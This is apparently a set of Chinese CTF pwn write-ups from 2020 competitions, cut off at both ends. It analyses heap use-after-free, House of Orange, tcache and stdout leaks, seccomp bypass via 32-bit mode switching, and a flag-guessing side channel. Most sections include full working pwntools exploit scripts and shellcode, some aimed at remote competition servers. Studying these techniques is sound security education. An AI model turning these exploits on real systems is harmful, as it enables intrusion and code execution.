0x2323232323232323\nmov [buf+0x18],a0\nmov a0, 0x2323232323232323\nmov [buf+0x20],a0\nmov a0, 0xa\nmov [buf+0x28],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x656d206c6c657423\nmov [buf+0x0],a0\nmov a0, 0x7369207461687720\nmov [buf+0x8],a0\nmov a0, 0x616e2072756f7920\nmov [buf+0x10],a0\nmov a0, 0x3a656d\nmov [buf+0x18],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x1b\nsyscall 1 //write\nmov a0, sp\npush a0\npop a1\nmov a0, 0x0\nmov a2, 0x1000\nsyscall 0 //read\nmov a0, sp\nsyscall 2 //puts\nmov a0, 0x20746168772c6b6f\nmov [buf+0x0],a0\nmov a0, 0x7720756f79206f64\nmov [buf+0x8],a0\nmov a0, 0x73206f7420746e61\nmov [buf+0x10],a0\nmov a0, 0x3a7961\nmov [buf+0x18],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x1b\nsyscall 1 //write\nmov a0, sp\npush a0\npop a1\nmov a0, 0x0\nmov a2, 0x1000\nsyscall 0 //read\nmov a0, 0x657220492c776f4e\nmov [buf+0x0],a0\nmov a0, 0x6f79206569766563\nmov [buf+0x8],a0\nmov a0, 0x617373656d207275\nmov [buf+0x10],a0\nmov a0, 0xa7e6579622c6567\nmov [buf+0x18],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x20\nsyscall 1 //write\npop256\nret\n```\n\n好了，要开始pwn的部分了\n\n要注意这里的call，保存指针不是常规意义上的”压栈”，它rsp是增加的（同理ret的rsp是减的）\n\nread 0x1000明显栈溢出，通过调试，理清楚结构\n\n![](https://i.loli.net/2020/09/20/TZtCDByOhWw4Maq.png)\n\n此时是系统调用write之前，\n\n在此之前会有一个push操作，内容是[buf+0x00]\n\n看一下栈情况\n\n![image-20200920185428434](https://i.loli.net/2020/09/20/sBD5fEgCiuLGNnW.png)\n\n可以看到多了一块地址，是指向内存数据区的，所以可以泄露出heap_base\n\n由于程序开了沙盒所以要用orw\n\n写出syscall的函数即可。\n\n需要注意的点：\n\n![image-20200925220738694](https://i.loli.net/2020/09/25/8oCkpEaHAQ5Tly6.png)\n\n其实系统调用也是虚拟系统调用，在这里，分别为0，1，2，3\n\n构造调用函数时也并非常规意义的syscall，要理解虚拟指令集来自己构造\n\n## exp\n\n```python\nfrom pwn import *\n#io=remote('124.70.153.199',8666)\nio = process('./vmpwn')\nlibc=ELF('libc-2.23.so')\n#context.log_level = 'debug'\nio.recv()\npay='a'*0x100\nio.send(pay)\nio.recvuntil('a'*0x100)\nelf_base=u64(io.recv(6)+'\\x00\\x00')-0x203851#leak elf_base\npay='b'*0xf0 + 'd'*0x10 + p64(elf_base+0x203020)#ret ip\nio.send(pay)\nio.recvuntil('tell me what is your name:')\npay='a'*0xf0\nio.send(pay)\nio.recvuntil('a'*0xf0)\nheap_base=u64(io.recv(6)+'\\x00\\x00')#leak heap_base\nsuccess('heap_base:'+hex(heap_base))\n# pause()\ndef call(a,b,c,ord):#def virtual syscall\n\tpay1='\\x11'\n \tpay1+=p64(a)\n\tpay1+='\\x12'\n \tpay1+=p64(b)\n \tpay1+='\\x13'\n \tpay1+=p64(c)\n \tpay1+='\\x8f'\n \tif ord==0:\n \t\tpay1+='\\x00'\n \tif ord==1:\n \t\tpay1+='\\x01'\n \tif ord==2:\n \t\tpay1+='\\x02'\n \treturn pay1\n\npay2=call(1,elf_base+0x2038E0,0x8,1)#  wrr  # sys_read\npay2+=call(0,elf_base+0x2038f8,0x8,0)# sys_free\npay2+=call(0,heap_base+0x2D18+0x110+87,0x1000,0)\npay=''\npay=pay.ljust(0x100,'\\x00')+p64(heap_base+0x2D18+0x110)+'\\x00'*8\npay+=pay2\nio.send(pay)\nlibc_base=u64(io.recvuntil('\\x7f')[-6:]+'\\x00\\x00')-libc.sym['read']\nlibc.address=libc_base #leak libc_base\nsystem_addr=libc.sym['system']\nbin_sh_addr=libc.search('/bin/sh\\x00').next()\nio.send(p64(libc.sym['open']))\npay=''\npay+='\\x11flag\\x00\\x00\\x00\\x00'\npay+='\\x33'+'\\x00'*8\npay+='\\x20'+'\\x00'*8\npay+='\\x12'\npay+=p64(0)\npay+='\\x13'\npay+=p64(0)\npay+='\\x8f'\npay+='\\x03'#free -> open\npay+=call(3,heap_base+0x2D18,0x30,0)#orw\npay+=call(1,heap_base+0x2D18,0x30,1)\npay+=call(0,heap_base+0x2D18,0x1000,0)+'\\xff'\nio.send(pay)\nsuccess('libc_base:'+hex(libc_base))\nsuccess('heap_base:'+hex(heap_base))\nsuccess('elf_base:'+hex(elf_base))\nio.interactive()\n```\n\n在本地写个flag文件，成功~\n\n![image-20200925225109306](https://i.loli.net/2020/09/25/HOVmvYPZo5M7NBe.png)\n\n# 0x02 钓鱼城杯 veryeasy\n\n第一次做glibc2.27，多了个tcache机制以及IOfile的利用，所以，，又得去学了\n\n直接去撸源码\n\n有一个坑点是Ubuntu尽量不要点升级，不知什么时候我的18.4已不是18.4了升到了19，所以tcache完善之后总是打不通，没办法恢复到了之前的快照才得以完成这道题\n\n看下程序\n\n![image-20200927004436835](https://i.loli.net/2020/09/27/5SXVB3nkCDWEZdJ.png)\n\n先申请十个堆块绕过检查\n\n接着就是tcache的uaf漏洞，1/16概率\n\n思路：\n\n绕过if检查之后，free掉7个填满tcache，第八个会放入unsortedbin，修改fd为stdout1/16的概率，之后把stdout malloc出来改写一下就可以leak信息。获得libc基址后就可以算malloc_hook的地址。不过这题不能直接向malloc_hook中写入one_gadget，得利用realloc函数做中专来满足one_gadget的条件。\n\n\n\n## exp\n\n注释掉的一部分是网上的原exp，但有些麻烦可以不采用，原理大概就是先申请到stdin的地址爆破出低第四位的地址，然后再修改到stdout处。\n\n这里改一下直接改写stdout\n\n```python\n#!/usr/bin/python\n#-*-coding:utf8-*-\nfrom pwn import *\nlibc = ELF('./libc-2.27.so')\n#context.log_level = 'debug'\ndef Add(index, size, content, p):\n    p.sendlineafter('Your choice :', '1')\n    p.sendlineafter('id:', str(index))\n    p.sendlineafter('size:', str(size))\n    p.sendafter('content:', content)\n\ndef Edit(index, content, p):\n    p.sendlineafter('Your choice :', '2')\n    p.sendlineafter('id:', str(index))\n    p.sendafter('content:', content)\n\ndef Delete(index, p):\n    p.sendlineafter('Your choice :', '3')\n    p.sendlineafter('id:', str(index))\n\ndef pwn():\n    p = process('./veryeasy')\n    Add(0, 0x80, 'A'*0x10, p)\n    Add(1, 0x80, 'A'*0x10, p)\n    Add(2, 0x80, 'A'*0x10, p)\n    Add(3, 0x80, 'A'*0x10, p)\n    Add(4, 0x80, 'A'*0x10, p)\n    Add(5, 0x80, 'A'*0x10, p)\n    Add(6, 0x80, 'A'*0x10, p)\n    Add(7, 0x80, 'A'*0x10, p)\n    Add(8, 0x80, 'A'*0x10, p)\n    Add(9, 0x80, 'A'*0x10, p)\n    Delete(0, p)\n    Delete(1, p)\n    Delete(2, p)\n    Delete(3, p)\n    Delete(4, p)\n    Delete(5, p)\n    Delete(0, p)\n    Delete(0, p)\n    #Edit(0, '\\x88\\xfa', p)\n    #Add(10, 0x80, 'A'*0x10, p)#0\n    #Add(11, 0x80, 'A'*0x10, p)#fa88 ->try 1/16\n    #tcache: fa88(fd)->x8d0\n    #Delete(2, p)# 2->x8d0\n    # 改写fd指针，使其指向stdout\n    #Edit(2, '\\x60\\x07', p)\n    #Add(12, 0x80, 'A'*0x10, p)\n\tEdit(0,'\\x60\\x07',p)\n    Add(10,0x80,'A'*0x10,p)\n    try:#_IO_2_1_stdout_\n        Add(11, 0x80, p64(0xfbad1800) + p64(0)*3 + '\\x00', p)\n        #关键点，看源码理解\n        gdb.attach(p)\n        libc_base = u64(p.recvuntil('\\x7f')[-6:] + '\\x00\\x00') - 0x3ed8b0\n        info(\"libc_base ==> \" + hex(libc_base))\n        libc.address = libc_base\n    except:\n        p.close()\n        return 0\n    if (libc_base >> 40) != 0x7f:\n        return 0\n\n    malloc_hook = libc.symbols['__malloc_hook']\n    info(\"malloc_hook ==> \" + hex(malloc_hook))\n    realloc = libc.symbols['__libc_realloc']\n    malloc = libc.symbols['__libc_malloc']\n    a = [0x4f365, 0x4f3c2, 0x10a45c]\n    one_gadget = libc_base + a[2]\n\n    Delete(0, p)\n    Edit(0, p64(malloc_hook-0x8), p)\n    Add(14, 0x80, 'A'*0x10, p)\n    Add(15, 0x80,p64(one_gadget) + p64(realloc+0x6), p)\n    p.sendlineafter('Your choice :', '1')\n    p.sendlineafter('id:', '16')\n    p.sendlineafter('size:', str(0x80))\n    p.interactive()\n    p.close()\n    return 1\n\nif __name__ == '__main__':\n    while True:\n        a = pwn()\n        if a:\n            break\n```\n\n***reference：***\n\n[IOFILE泄露libc](https://n0va-scy.github.io/2019/09/21/IO_FILE/)\n\n\n\n# 0x03 CUMTCTF2020 babyheap\n\n这是很早做过的题稍微改了改放在了校赛\n\n先查看一下保护，可改写got表。UAF+Double free\n\nadd函数\n\n每次add都会malloc了两个堆：\n\ns相当于指针数组，分别存放标志位、buf指针、message；\n\nbuf存放game message\n\n```c\nint add()\n{\n  size_t size; // [rsp+0h] [rbp-20h]\n  void *s; // [rsp+8h] [rbp-18h]\n  void *buf; // [rsp+10h] [rbp-10h]\n  unsigned __int64 v4; // [rsp+18h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  s = 0LL;\n  buf = 0LL;\n  LODWORD(size) = 0;\n  if ( (unsigned int)count > 9 )\n    return puts(\"Too much!!!\");\n  s = malloc(0x28uLL);\n  memset(s, 0, 0x28uLL);\n  puts(\"size of the game's name: \");\n  if ( (unsigned int)__isoc99_scanf(\"%u\", &size) == -1 )\n    exit(-1);\n  buf = malloc((unsigned int)size);\n  if ( !buf )\n  {\n    puts(\"Error !!\");\n    exit(-1);\n  }\n  puts(\"game's name:\");\n  read(0, buf, (unsigned int)size);\n  *((_QWORD *)s + 1) = buf;\n  puts(\"game's message:\");\n  __isoc99_scanf(\"%23s\", (char *)s + 16);\n  *(_DWORD *)s = 1;\n  for ( HIDWORD(size) = 0; HIDWORD(size) <= 9; ++HIDWORD(size) )\n  {\n    if ( !list[HIDWORD(size)] )\n    {\n      list[HIDWORD(size)] = s;\n      break;\n    }\n  }\n  ++count;\n  return puts(\"Added!\");\n}\n```\n\ndelete函数，存在uaf漏洞，\n\n```c\nint del()\n{\n  int result; // eax\n  unsigned int v1; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  if ( !count )\n    return puts(\"Null!\");\n  puts(\"game's index:\");\n  __isoc99_scanf(\"%d\", &v1);\n  if ( v1 <= 9 && list[v1] )\n  {\n    *list[v1] = 0;\n    free(*((void **)list[v1] + 1));\n    result = puts(\"Deleted!\");\n  }\n  else\n  {\n    puts(\"index error!\");\n    result = 0;\n  }\n  return result;\n}\n```\n\n泄露main_arena+88的地址，从而计算libc基址，使用doublefree从而改写malloc_hook的地址，getshell。\n\n## exp\n\n```python\nfrom pwn import*\ncontext.log_level = 'debug'\ndef menu(ch):\n\tp.sendlineafter('choice :',str(ch))\ndef new(size,name,content):\n\tmenu(1)\n\tp.sendlineafter(\"game's name:\",str(size))\n\tp.sendafter(\"game's name:\",name)\n\tp.sendlineafter(\"game's message:\",content)\ndef free(index):\n\tmenu(3)\n\tp.sendlineafter('index:',str(index))\ndef show():\n\tmenu(2)\np = process('./babyheap')\nlibc = ELF('./libc-2.23.so')\nnew(0x100,'1111','1111')\nnew(0x68,'1111','1111')\nnew(0x68,'1111','1111')\nfree(0)#unsortedbin\nnew(0xD0,'\\x78','\\x78')\nshow()\nlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - libc.sym['__malloc_hook'] - 0x68\nlog.info('libc:\\t' + hex(libc_base))\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nprint hex(malloc_hook)\nog = libc_base + 0xf1207\nrealloc = libc_base + libc.sym['realloc']\nfree(1)\nfree(2)\nfree(1)\nnew(0x68,p64(malloc_hook - 0x23),'2222')\nnew(0x68,'ld1ng','ld1ng')\nnew(0x68,'ld1ng','ld1ng')\nnew(0x68,'\\x00'*(0x13-8) + p64(og) + p64(realloc + 4),'ld1ng')\nmenu(1)\np.interactive()\n```\n\n\n\n# 0x04 ciscn2020 pwn2\n\n一道国赛题，**pwnht**学长赛后给我发了exp，今天才想起来看一下，不过学长有些地方写的不是很懂，所以根据思路改了改，现在起码自己能看懂了。\n\n题目叫heap_stack，本以为会和栈有关其实不然\n\n![image-20200929161614624](https://i.loli.net/2020/09/29/lQUBk9MxvRVnOHW.png)\n\n像普通堆题一样，push和puuuuush相当于add，pop是增加可push的次数，show就是show\n\n漏洞存在于push函数中，存在堆溢出\n\n```c\nunsigned __int64 push()\n{\n  __int64 nbytes; // ST00_8\n  size_t size; // ST08_8\n  void *buf; // ST10_8\n  unsigned __int64 v4; // [rsp+18h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  if ( num <= 9 )\n  {\n    puts(\"size?\");\n    nbytes = sub_B49();\n    size = nbytes & 0xFFF;//取后三个字节\n    buf = malloc(size);\n    puts(\"content?\");\n    read(0, buf, nbytes);//读入的大小未作限制\n    printf(\"Malloc at  %p.\\n\", buf, nbytes, size);\n    ptr[num++] = buf;\n  }\n  return __readfsqword(0x28u) ^ v4;\n}\n```\n\n起码找到漏洞后在fix阶段还是有帮助的\n\n利用方式为House of Orange，泄露出libc，利用puuuush可以申请大堆块的特点，讲堆块申请到malloc_hook处，修改为one_gadget之后触发漏洞即可。\n\n## exp\n\n```python\n#!/usr/bin/env python\nfrom pwn import *\n#context.log_level='debug'\ndef uu64(data):\n\tnum = u64(data.ljust(8, b'\\x00'))\n\tlog.success(\"%#x\" %(num))\n\treturn num\ndef add(size,text):\n\tio.sendlineafter(\">\",str(1))\n\tio.sendlineafter(\"?\",str(size))\n\tio.sendafter(\"?\",text)\ndef add2(size,text):\n\tio.sendlineafter(\">\",str(2))\n\tio.sendlineafter(\"?\",str(size))\n\tio.sendafter(\"?\",text)\nlibc=ELF('/lib/x86_64-linux-gnu/libc.so.6')\nio=process('./heap_stack')\nadd(0x1018,p64(0x20)+p64(0xfe1)+p64(0x20)+p64(0x0fe1))#改topchunk大小\nadd(0xfff,'bbb')#HOO，unsortedbin\nadd(0xfb0,p8(0x78))\nio.sendlineafter(\">\",str(4))#show\nio.recv()\nlibc_addr=uu64(io.recv(6))\na= [0x45226,0x4527a,0xf0364,0xf1207]\nlibc_base=libc_addr-0x68-libc.sym['__malloc_hook']\n#print hex(libc.sym['__malloc_hook'])\nmalloc_hook=libc_base+libc.sym['__malloc_hook']\none_gadget=libc_base+a[3]\nprint(\"libc_base=\"+hex(libc_base))\nadd(0xfe0-0x90-0x10,'a')\n\nadd(0x1000,'a'*0x10+p64(0x20)+p64(0xFFFFFFFFFFFFFfe1))#改topchunk\nio.recvuntil(\"Malloc at  \")\nheap_addr=int(io.recv(14),16)\noffset=malloc_hook-(heap_addr+0x30)\nadd2(offset,'a')\nadd(0x20,p64(one_gadget))\n# io.recvuntil('>',str(3))\n# add(0x30,'a')\npause()\nio.interactive()\n\n```\n\n临近下课终于成功了，，okok\n\n![image-20200929163303056](https://i.loli.net/2020/09/29/X5W1dEGZnt2lN6h.png)\n\n# 0x06 小结\n\n还有一个题网上资料也比较少，十一补","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Aug_Match 2020","url":"/2020/09/01/Aug_Match/","content":"\n# 0x00 前言\n\n2020年在家摸鱼的暑假生活快结束了，终于要开学了，好长时间不更博客了，一直攒着一起发，再加上现在的题目网上详细解析越来越少，只能自己慢慢啃，我又啃得比较慢\n\n在这我会记录并复现一些比赛时的题目，权当一个月来的学习成果，还可以搞一个每月系列（不错不错）\n\n------\n\n# 0x01 2020天翼杯 SafeBox\n\n先看题目描述：Try to get the secret from SafeBox! Flag is at /home/pwn/flag\n\nchecksec，保护全开\n\n![](https://s1.ax1x.com/2020/08/06/ag3VMT.png)\n\nmmap给dest赋予了7的权限，最后函数指针执行了dest。典型的shellcode。prtcl和seccomp开了沙盒。\n\n\n\n![image-20200824204011656](https://i.loli.net/2020/08/24/6tvfJlVAZPeNmpQ.png)\n\n能调用的函数只有open和read，不能使用write，只能利用read函数读取flag，然后跟本地的flag一个字节一个字节去比较。\n\n还有当read的fd<4时，会直接跳到0013KILL掉，就是说fd要大于等于4。所以写shellcode时open两次，第一次文件标识符是3，第二次文件标识符是4。\n\n爆破的方法就是把单个字节的flag(rsp+index)放进al寄存器，用ascii码0x20-0x7f之间的字符(content)一个个去比较，若cmp比较结果一致则改变ZF标志寄存器，然后用jz跳转x标签处，进行死循环。\n\n## exp\n\n```python\nfrom pwn import *\nimport os\ncontext.arch = 'amd64'\nelf = ELF('chall')\np = 0\ndef pwn(index,content):\n    global p\t\t\t\t\t\t\t#在函数内部对函数外的变量进行操作，就需要在函数内部声明其为global全局变量\n\tp = process('./chall')\n\tshellcode= shellcraft.open(\"flag\")  #调用open的系统调用，open(\"flag\")\n\tshellcode+= shellcraft.open(\"flag\") #因为fd要大于等于4，open两次\n\tshellcode+='''\t\t\t\t\t\t#read(4,rsp,0x64)\n    xor rax, rax            \n    push 0x64      \t\t\t\t\t\n    pop rdx                        \n    mov rsi, rsp                    \n\tpush 4                              \n\tpop rdi                           \n    syscall                         \nx:\tmov rsi,rsp                         #由于我们往栈顶输入数据，因此此时的栈顶存放是flag的内容，将rsp的内容赋值给rsi\n\tmov al,[rsi+'''+str(index)+''']     #[rsi+index],取出[rsi+index]的内容,即将flag一个字节一个字节取出，存放在al寄存器里，方便后面爆破flag\n\tcmp al,'''+str(content)+'''         #比较字符，与存放在al寄存器中的单个字节flag是否一致\n\tjz x       \t\t\t\t\t\t    #若一致则直接进入死循环，需要ctrl+d退出，若不一致则直接返回\n\t'''\n\tp.sendafter(\"safe-execution box?\\n\",asm(shellcode))\n\tp.recv(timeout = 1)                 #如果超过一秒就不等了\n\tp.interactive()\n\tp.close()\n\treturn 1\nif __name__ == '__main__':       \t\t\n\tflag=\"\"\n\tindex=0\n\twhile(1):\n\t\tif '}' in flag:                 #读到末尾跳出循环\n\t\tbreak\n\t\tfor i in range(0x20,0x7f):      #content是ascii码0x20-0x7f对应的可见字符，for循环一个个试\n\t\t\ttry:                         #try except处理报错，flag没猜对就EOF报错跳到下面打印error\n\t\t\t\tprint \"flag=\",flag\n\t\t\t\tif pwn(index,i) :       #死循环得到正确值，强制退出后会返回1\n\t\t\t\t\tflag+=chr(i)\t\t#chr()返回ascii码对应字符，加在flag后面\n\t\t\t\t\tindex+=1            #进行下一个字节爆破\n\t\t\t\t\tbreak\n\t\t\texcept EOFError:            #若直接返回则抛出异常\n\t\t\t\tprint \"error\"\n\tprint flag\n    \n# DASCTF{0ee3530c57fb0b9c89e7af5d32b9f521} \n```\n\n环境已经关了，体验很不好\n\n现在需要爆破的题越来越多，可能pwn的精髓就在于爆破吧\n\n# 0x02 SCTF Coolcode\n\n本题考验(极强的)shellcode编写能力\n\n拿到题目\n\n![image-20200824174318169](https://i.loli.net/2020/08/24/8vs7gReZM93OVTl.png)\n\n看起来很像堆题，但是NX没开，估计可以利用shellcode，\n\n![image-20200824174746374](https://i.loli.net/2020/08/24/sdPHhpxvm1I47w2.png)\n\n漏洞真的难找....在创建堆块时，对数组下标错误的使用了有符号数，导致如果我们输入**负数**也可以满足`v1 <= 1`这样的检测，而在数组上方保存了例如stdin\\stdout\\stderr、got表等这样的可利用信息。\n而且这个程序并没有开启FULL RELRO所以got表可写，这样其实我们可以直接劫持got表。\n\n**沙箱绕过**：\n\n程序限制了我们能用的系统调用，而并没有open函数，所以不能利用orw\n\n![](https://i.loli.net/2020/08/24/ozduG6qvYLw7afh.png)\n\n但是查询系统调用号表，发现fstat这个函数对应的系统调用号5，其实就是32位程序中open的系统调用号，而汇编中存在一条指令retfq可以供我们切换到32位指令模式，其原理是一个cs寄存器，cs=0x23时表示32位模式，cs=0x33时表示64位模式，\n\n我们只需要在进行retfq时保证此时rsp=shellcode地址，[rsp+8] = 0x23/0x33，就可以在我们想要的模式下执行shellcode。\n\n![](https://i.loli.net/2020/08/24/DQvIXdqY62F5pHg.png)\n\n堆和bss段可执行，所以可以将shellcode写入bss段执行。\n但是还有一点在于，程序限制输入字符只能是数字和大写字母，这样输入shellcode肯定是行不通的\n\n```c\nsigned __int64 __fastcall sub_400B16(__int64 a1, int a2)\n{\n  int i; // [rsp+14h] [rbp-8h]\n\n  for ( i = 0; i < a2 - 1; ++i )\n  {\n    if ( (*(_BYTE *)(i + a1) <= 47 || *(_BYTE *)(i + a1) > 57) && (*(_BYTE *)(i + a1) <= 64 || *(_BYTE *)(i + a1) > 90) )\n      return 1LL;\n  }\n  return 0LL;\n}\n```\n\n所以，还要先将exit()函数的got表改为ret，以跳过输入字符的检验。\n\n这道题我们的思路就很清晰：因为程序还限定了读取字节长度，为了方便一次性执行shellcode，我们先写入read将后面shellcode写入到bss段并执行。shellcode的内容：首先切换32位模式执行open()然后切换回64位执行read()、write()即可读取到flag\n\n## exp\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = './CoolCode'\np = remote(\"39.107.119.192 \", 9999)    \ndef add(idx, content):\n    p.sendlineafter(\"choice :\", '1')\n    p.sendlineafter(\"Index: \", str(idx))\n    p.sendafter(\"messages: \", content)\ndef show(idx):\n    p.sendlineafter(\"choice :\", '2')\n    p.sendlineafter(\"Index: \", str(idx))\ndef free(idx):\n    p.sendlineafter(\"choice :\", '3')\n    p.sendlineafter(\"Index: \", str(idx))\ndef exp():\n    read = '''\n        xor eax, eax\n        mov edi, eax\n        push 0x60\n        pop rdx\n        mov esi, 0x1010101\n        xor esi, 0x1612601\n        syscall\n        mov esp, esi\n        retfq\n    '''\n    open_x86 = '''\n        mov esp, 0x602770\n        push 0x67616c66\n        push esp\n        pop ebx\n        xor ecx,ecx\n        mov eax,5\n        int 0x80\n    '''\n    readflag = '''\n        push 0x33\n        push 0x60272e\n        retfq\n        mov rdi,0x3\n        mov rsi,rsp\n        mov rdx,0x60\n        xor rax,rax\n        syscall\n        mov rdi,1\n        mov rax,1\n        syscall\n    '''\n    readflag = asm(readflag, arch = 'amd64')\n    openflag = asm(open_x86)\n    add(-22, '\\xc3') #exit_got->ret\n    add(-37, asm(read, arch = 'amd64')) #free_got ->read\n    #gdb.attach(p)\n    free(0)\n    \n    payload = p64(0x602710)+p64(0x23)+openflag+readflag\n    p.sendline(payload)\n    p.interactive()\nif __name__ == '__main__':\n    exp()\n\n#SCTF{LDI6Uk9PXa9e98rqFdtxHvN3qO1ZAmnBX76C5D0Ibckv4dqe}\n#随机生成的flag\n```\n\n本题需要高超的shellcode能力，/(ㄒoㄒ)/光看就够我理解半天了\n比赛时有31解，还是很有难度的\n\n***Reference：***\n\n[syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)\n\n[shellcode 的艺术](https://xz.aliyun.com/t/6645)\n\n------\n\n# 0x03 2020 CISCN nofree\n\n国赛除了easyjsc，算是pwn1了，题目是这样的，功能一个添加一个编辑\n\n![image-20200901003905336](https://i.loli.net/2020/09/01/ZA24zES1g6P7kDy.png)\n\n这就是本题难点，没有free，无法利用bins；没有show，无法泄露数据\n\n先看add函数\n\n```c\nint add()\n{\n  int result; // eax\n  int idx; // [rsp+8h] [rbp-8h]\n  int size; // [rsp+Ch] [rbp-4h]\n\n  result = put_in_idx();//这里限制了最多建立三个索引，但是没有进行检查，所以同一索引可以重复使用\n  idx = result;\n  if ( result != -1 )\n  {\n    printf(\"size: \");\n    result = input_0();\n    size = result;\n    if ( result >= 0 && result <= 144 )//每个块一次最多申请0x90大小\n    {\n      *(_QWORD *)&byte_6020C0[16 * idx + 256] = content(result);//存放堆指针\n      result = size;\n      *(_QWORD *)&byte_6020C0[16 * idx + 264] = size;//存放size指针\n    }\n  }\n  return result;\n}\n```\n\n可以看到content函数，里面并没有使用malloc()，而是使用了strdup()，也就是说malloc的堆块大小并不由你输入的size大小决定，而是你content内字符串的实际大小，而edit函数内容修改按照的是你输入的size，这就造成了堆溢出\n\n```c\nsigned __int64 edit()\n{\n  signed __int64 result; // rax\n  int idx; // [rsp+Ch] [rbp-4h]\n\n  result = put_in_idx();\n  idx = result;\n  if ( (_DWORD)result != -1 )\n  {\n    result = *(_QWORD *)&byte_6020C0[16 * (signed int)result + 256];\n    if ( result )\n    {\n      printf(\"content: \");\n      result = input(*(void **)&byte_6020C0[16 * idx + 256], *(_QWORD *)&byte_6020C0[16 * idx + 264]);\n    }\n  }\n  return result;\n```\n\n- add功能：最多3个块，大小在0~0x90之间，用的strdup函数\n- edit功能：能编辑相应堆块，大小为add时写入的size\n\n简单来说，add时填0x20的大小，只填充0x10的字符串，edit的时候就存在溢出漏洞\n\n所以整体思路是先用house of orange，把top chunk扔到fastbin，然后利用堆溢出改fd指向bss上chunk array的地方，通过修改堆指针，来将strdup的got表改为printf，然后利用格式化字符串漏洞泄露出libc基址，最后同样的方法将strdup改为system函数，触发漏洞即可\n\n为了方便我在exp作了注释，就不再过多赘述\n前面做的工作就是为了接近这三个指针，用来修改strdup的got表\n\n![image-20200901012734532](https://i.loli.net/2020/09/01/MXNzjxZwI71ptac.png)\n\n在格式化字符串找偏移时不太顺利，主要还是动调的问题，因为函数比较多，要对照IDA的代码看，多用s步入，才能调出来，还要注意64位的六个寄存器传参的问题。\n\n![image-20200901011317070](https://i.loli.net/2020/09/01/7ZvfkbM8O1S4zAd.png)\n\n![image-20200901011403277](https://i.loli.net/2020/09/01/QTz31ln78SUtRxu.png)\n\n## exp\n\n```python\n#coding:utf8\nfrom pwn import *\n#context.log_level = 'debug'\ndebug = 1\nelf = ELF('nofree')\nif debug:\n    sh = process('./nofree')\n    libc = elf.libc\nelse:\n    sh = remote('101.200.53.148', 12301)\n    libc = ELF('libc-2.27-64.so')\n\ndef add(idx,size,data):\n    sh.sendlineafter('choice>> ',str(1))\n    sh.recvuntil('idx: ')\n    sh.sendline(str(idx))\n    sh.recvuntil('size: ')\n    sh.sendline(str(size))\n    sh.recvuntil('content: ')\n    sh.send(str(data))\n\ndef edit(idx,data):\n    sh.sendlineafter('choice>> ',str(2))\n    sh.recvuntil('idx: ')\n    sh.sendline(str(idx))\n    sh.recvuntil('content: ')\n    sh.send(str(data))\nfor i in range(24):\n    add(0,0x90,'a'*0x90)\nadd(0,0x90,'a')\nedit(0,'\\x00'*0x18+p64(0xe1))#修改top chunk的size，注意对齐内存页\nadd(0,0x90,'a'*0x30)\nadd(1,0x90,'a'*0x88+p64(0x81))#house of orange\nedit(0,'b'*0x30+p64(0)+p64(0x81)+p64(0x602140))#fastbin attack:fd->0x602140\nadd(0,0x90,'a'*0x70)\nadd(2,0x90,'c'*0x70+p64(0)*3+p64(0x81))#addr:0x602140\nedit(2,'c'*0x70+p64(0x602068)+p64(0x90))#修改idx0的指针为strdup的got表\nedit(0,p64(0x400700))#改为printf\n#gdb.attach(sh)\nadd(0,0x10,'%17$p')#fmtstr\n\nlibc_base = int(sh.recv(14),16) - libc.sym['__libc_start_main'] - 240\n#0x20840\nprint hex(libc_base)\nedit(2,'c'*0x70+p64(elf.got['strdup'])+p64(0x90))\nedit(0,p64(libc_base+libc.symbols['system']))\nadd(0,0x10,'/bin/sh\\x00')\nsh.interactive()\n```\n\nonegaget应该也可以没试过，太晚了歇了歇了...\n\n***Reference：***\n\n[house of orange](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/#_1)\n\n[堆溢出-House of orange 学习笔记](https://bbs.pediy.com/thread-222718.htm)\n\n# 0x04 2020强网杯 babymessage\n\n说到这题，比赛一百多解，但始终卡在一个点，题目除了NX外，无其他保护\n\n```c\n__int64 work()\n{\n  signed int v1; // [rsp+Ch] [rbp-4h]\n\n  buf = (char *)malloc(0x100uLL);\n  v1 = mm + 16;//可读入的长度，由mm决定\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        while ( 1 )\n        {\n          puts(\"choice: \");\n          __isoc99_scanf((__int64)\"%d\", (__int64)&mm)//mm即option，存入内存\n          if ( mm != 1 )\n            break;\n          leave_name();//输入名字，存到0x6010D0位置\n        }\n        if ( mm != 2 )\n          break;\n        if ( v1 > 256 )\n          v1 = 256;//长度\n        leave_message(v1);//输入信息，堆块指针存入0x6010C8处\n      }\n      if ( mm != 3 )\n        break;\n      show(v1);//打印\n    }\n    if ( mm == 4 )\n      break;//退出\n    puts(\"invalid choice\");\n  }\n  return 0LL;\n}\n```\n\n一个姓名，信息和打印功能的程序，类似堆题但没有堆的可利用点\n简单看一下option，buf，name在内存的分布\n\n![image-20200827005910158](https://i.loli.net/2020/08/27/hfIc5FgyqswpevZ.png)\n\n找啊找，程序似乎写的很好，没什么利用\n但是依旧存在一个小bug\n\n```c\n__int64 __fastcall leave_message(unsigned int a1)\n{\n  int v1; // ST14_4\n  __int64 v3; // [rsp+18h] [rbp-8h]\n\n  puts(\"message: \");\n  v1 = read(0, &v3, a1);\n  strncpy(buf, (const char *)&v3, v1);\n  buf[v1] = 0;\n  puts(\"done!\\n\");\n  return 